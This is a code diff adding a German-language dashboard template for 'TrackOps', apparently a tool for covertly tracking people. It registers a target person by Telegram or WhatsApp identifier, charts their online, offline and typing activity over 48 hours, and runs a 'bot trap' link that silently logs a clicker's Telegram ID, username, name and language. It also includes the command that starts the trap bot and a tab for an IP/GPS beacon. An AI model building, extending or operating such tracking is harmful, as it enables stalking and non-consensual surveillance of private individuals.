@@ -1,0 +1,306 @@
+{% extends "base.html" %}
+{% block title %}Messenger Tracking — TrackOps{% endblock %}
+
+{% block content %}
+
+<!-- Nav-Tabs -->
+<ul class="nav nav-tabs mb-4" style="border-color:#30363d;">
+  <li class="nav-item">
+    <a class="nav-link" href="/">
+      <i class="bi bi-crosshair2"></i> IP/GPS Beacon
+    </a>
+  </li>
+  <li class="nav-item">
+    <a class="nav-link active" style="background:#161b22; border-color:#30363d #30363d #161b22;" href="/messenger">
+      <i class="bi bi-chat-dots text-info"></i> Messenger
+    </a>
+  </li>
+</ul>
+
+<div class="row g-4">
+
+  <!-- Linke Spalte: Ziel hinzufügen + Targets -->
+  <div class="col-lg-4">
+
+    <!-- Ziel hinzufügen -->
+    <div class="card mb-4">
+      <div class="card-header"><i class="bi bi-person-plus text-info"></i> Tracking-Ziel hinzufügen</div>
+      <div class="card-body">
+        <form method="POST" action="/messenger/target">
+          <div class="mb-3">
+            <label class="form-label text-muted small">Bezeichnung</label>
+            <input type="text" name="label" class="form-control" placeholder="z.B. Zielperson A" required>
+          </div>
+          <div class="mb-3">
+            <label class="form-label text-muted small">Plattform</label>
+            <select name="platform" class="form-select" id="platformSelect" onchange="updateHint()">
+              <option value="telegram">Telegram</option>
+              <option value="whatsapp">WhatsApp</option>
+            </select>
+          </div>
+          <div class="mb-3">
+            <label class="form-label text-muted small" id="identLabel">Telegram @Username oder +Telefonnummer</label>
+            <input type="text" name="identifier" class="form-control" id="identInput"
+                   placeholder="@username oder +49123..." required>
+            <div class="form-text text-muted" id="identHint">
+              Telegram: @username, +Telefonnummer oder numerische User-ID
+            </div>
+          </div>
+          <button type="submit" class="btn btn-info w-100">
+            <i class="bi bi-plus-circle"></i> Ziel hinzufügen
+          </button>
+        </form>
+      </div>
+    </div>
+
+    <!-- Aktive Targets -->
+    <div class="card mb-4">
+      <div class="card-header"><i class="bi bi-people text-warning"></i> Aktive Ziele</div>
+      <div class="card-body p-0">
+        {% if targets %}
+        <div class="list-group list-group-flush">
+          {% for t in targets %}
+          {% set last = status_events | selectattr('target_id', 'equalto', t['id']) | list | first %}
+          <div class="list-group-item" style="background:#161b22; border-color:#30363d;">
+            <div class="d-flex justify-content-between align-items-start">
+              <div>
+                <div class="fw-bold">{{ t['label'] }}</div>
+                <span class="badge {% if t['platform'] == 'telegram' %}bg-primary{% else %}bg-success{% endif %} me-1">
+                  {{ t['platform'] | capitalize }}
+                </span>
+                <code style="font-size:0.8rem;">{{ t['identifier'] }}</code><br>
+                {% if last %}
+                  <small class="text-muted">Letzter Status:
+                    <span class="badge {% if last['status'] == 'online' %}bg-success{% elif last['status'] == 'typing' %}bg-warning text-dark{% elif last['status'] == 'error' %}bg-danger{% else %}bg-secondary{% endif %}">
+                      {{ last['status'] }}
+                    </span>
+                    {{ last['timestamp'][:16] | replace('T',' ') }} UTC
+                  </small>
+                {% else %}
+                  <small class="text-muted">Noch keine Daten — Monitor starten</small>
+                {% endif %}
+              </div>
+              <form method="POST" action="/messenger/target/{{ t['id'] }}"
+                    onsubmit="return confirm('Ziel löschen?')">
+                <button type="submit" class="btn btn-sm btn-outline-danger">
+                  <i class="bi bi-trash3"></i>
+                </button>
+              </form>
+            </div>
+          </div>
+          {% endfor %}
+        </div>
+        {% else %}
+        <div class="text-muted text-center p-4">Noch keine Ziele.</div>
+        {% endif %}
+      </div>
+    </div>
+
+    <!-- Telegram Bot -->
+    <div class="card">
+      <div class="card-header"><i class="bi bi-robot text-success"></i> Telegram Bot-Falle</div>
+      <div class="card-body">
+        <p class="text-muted small mb-2">
+          Wenn das Ziel auf einen Bot-Link klickt → Telegram-ID, Username,
+          Sprache werden automatisch geloggt. Kein Zugriff auf Kontaktliste nötig.
+        </p>
+        <div class="alert alert-secondary p-2" style="font-size:0.8rem;">
+          <code>https://t.me/<b>DeinBotName</b>?start=TOKEN</code>
+        </div>
+        <div class="text-muted small">
+          <i class="bi bi-terminal"></i>
+          <code>TELEGRAM_BOT_TOKEN=xxx python monitors/telegram_bot.py</code>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Rechte Spalte: Status-Timeline + Aktivitätskarte + Bot-Interaktionen -->
+  <div class="col-lg-8">
+
+    <!-- Status-Timeline Chart -->
+    <div class="card mb-4">
+      <div class="card-header">
+        <i class="bi bi-activity text-info"></i> Online-Aktivität Timeline
+      </div>
+      <div class="card-body">
+        <canvas id="activityChart" height="80"></canvas>
+        <div class="mt-2 text-muted small text-center">
+          Grün = Online · Grau = Offline · Gelb = Schreibt gerade
+        </div>
+      </div>
+    </div>
+
+    <!-- Status Events Tabelle -->
+    <div class="card mb-4">
+      <div class="card-header">
+        <i class="bi bi-list-ul text-warning"></i> Status-Events
+        <span class="badge bg-secondary ms-2">{{ status_events | length }}</span>
+      </div>
+      <div class="card-body p-0">
+        <div class="table-responsive" style="max-height:300px; overflow-y:auto;">
+          <table class="table table-sm table-hover mb-0">
+            <thead style="background:#1c2128; position:sticky; top:0;">
+              <tr>
+                <th>Zeit (UTC)</th>
+                <th>Ziel</th>
+                <th>Plattform</th>
+                <th>Status</th>
+                <th>Details</th>
+              </tr>
+            </thead>
+            <tbody>
+              {% for e in status_events %}
+              <tr>
+                <td><small>{{ e['timestamp'][:16] | replace('T',' ') }}</small></td>
+                <td><small>{{ e['label'] }}<br><code style="font-size:0.7rem;">{{ e['identifier'] }}</code></small></td>
+                <td>
+                  <span class="badge {% if e['platform'] == 'telegram' %}bg-primary{% else %}bg-success{% endif %}">
+                    {{ e['platform'] }}
+                  </span>
+                </td>
+                <td>
+                  <span class="badge
+                    {% if e['status'] == 'online' %}bg-success
+                    {% elif e['status'] == 'typing' %}bg-warning text-dark
+                    {% elif e['status'] == 'offline' %}bg-secondary
+                    {% elif e['status'] == 'error' %}bg-danger
+                    {% else %}bg-dark border{% endif %}">
+                    {{ e['status'] }}
+                  </span>
+                </td>
+                <td>
+                  {% set d = e['details'] | tojson %}
+                  <small class="text-muted" title="{{ d }}">
+                    {% if e['status'] == 'offline' and 'last_seen' in e['details'] %}
+                      {{ (e['details'] | tojson | replace('"','') | truncate(30)) }}
+                    {% endif %}
+                  </small>
+                </td>
+              </tr>
+              {% else %}
+              <tr>
+                <td colspan="5" class="text-center text-muted py-3">
+                  Noch keine Status-Events. Monitor-Script starten.
+                </td>
+              </tr>
+              {% endfor %}
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- Bot-Interaktionen -->
+    <div class="card">
+      <div class="card-header">
+        <i class="bi bi-robot text-success"></i> Bot-Interaktionen
+        <span class="badge bg-secondary ms-2">{{ interactions | length }}</span>
+      </div>
+      <div class="card-body p-0">
+        <div class="table-responsive">
+          <table class="table table-sm table-hover mb-0">
+            <thead style="background:#1c2128;">
+              <tr>
+                <th>Zeit (UTC)</th>
+                <th>Plattform</th>
+                <th>User-ID</th>
+                <th>Username</th>
+                <th>Name</th>
+                <th>Sprache</th>
+                <th>Token</th>
+              </tr>
+            </thead>
+            <tbody>
+              {% for i in interactions %}
+              <tr>
+                <td><small>{{ i['timestamp'][:16] | replace('T',' ') }}</small></td>
+                <td><span class="badge bg-primary">{{ i['platform'] }}</span></td>
+                <td><code style="font-size:0.8rem;">{{ i['user_id'] }}</code></td>
+                <td>{% if i['username'] %}<code>@{{ i['username'] }}</code>{% else %}<span class="text-muted">—</span>{% endif %}</td>
+                <td>{{ i['first_name'] }} {{ i['last_name'] }}</td>
+                <td><span class="badge bg-secondary">{{ i['language'] or '—' }}</span></td>
+                <td><span class="token-pill">{{ i['token'][:8] or '—' }}</span></td>
+              </tr>
+              {% else %}
+              <tr>
+                <td colspan="7" class="text-center text-muted py-3">
+                  Noch keine Bot-Interaktionen.
+                </td>
+              </tr>
+              {% endfor %}
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+<script>
+function updateHint() {
+  const p = document.getElementById('platformSelect').value;
+  document.getElementById('identHint').textContent = p === 'telegram'
+    ? 'Telegram: @username, +Telefonnummer oder numerische User-ID'
+    : 'WhatsApp: Internationale Telefonnummer, z.B. +49123456789';
+  document.getElementById('identInput').placeholder = p === 'telegram'
+    ? '@username oder +49123...'
+    : '+49123456789';
+}
+
+// Aktivitäts-Chart aus Status-Events aufbauen
+const rawEvents = {{ status_events | tojson }};
+
+// Letzte 48h in 30-Minuten-Buckets
+const now = new Date();
+const buckets = 96; // 48h × 2
+const labels = [], data = [], colors = [];
+
+for (let i = buckets - 1; i >= 0; i--) {
+  const t = new Date(now - i * 30 * 60 * 1000);
+  labels.push(t.toISOString().slice(11, 16));
+  const bucketStart = new Date(now - (i + 1) * 30 * 60 * 1000).toISOString();
+  const bucketEnd   = new Date(now - i * 30 * 60 * 1000).toISOString();
+  const eventsInBucket = rawEvents.filter(e =>
+    e.timestamp >= bucketStart && e.timestamp < bucketEnd
+  );
+  const hasOnline  = eventsInBucket.some(e => e.status === 'online');
+  const hasTyping  = eventsInBucket.some(e => e.status === 'typing');
+  const hasOffline = eventsInBucket.some(e => e.status === 'offline');
+  if (hasOnline)       { data.push(1); colors.push('#238636'); }
+  else if (hasTyping)  { data.push(1); colors.push('#d29922'); }
+  else if (hasOffline) { data.push(1); colors.push('#30363d'); }
+  else                 { data.push(0); colors.push('#0d1117'); }
+}
+
+new Chart(document.getElementById('activityChart'), {
+  type: 'bar',
+  data: {
+    labels,
+    datasets: [{
+      data,
+      backgroundColor: colors,
+      borderWidth: 0,
+      barPercentage: 1.0,
+      categoryPercentage: 1.0,
+    }]
+  },
+  options: {
+    plugins: { legend: { display: false } },
+    scales: {
+      x: {
+        ticks: { maxTicksLimit: 12, color: '#8b949e', font: { size: 10 } },
+        grid: { display: false },
+      },
+      y: { display: false, max: 1 }
+    },
+    animation: false,
+  }
+});
+</script>
+{% endblock %}
